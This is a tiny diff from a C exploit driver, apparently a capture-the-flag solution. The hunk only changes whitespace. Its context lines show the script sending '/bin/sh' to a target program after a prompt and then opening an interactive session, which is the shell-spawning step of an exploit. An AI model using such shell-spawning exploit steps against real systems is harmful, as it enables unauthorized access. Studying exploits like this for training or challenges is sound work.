@@ -80,6 +80,7 @@ int main(){
     io32(2, 0);
     Recvuntil("> ", 0);
     Sendline("/bin/sh");
-    
+   	
+	
     interactive();
 }
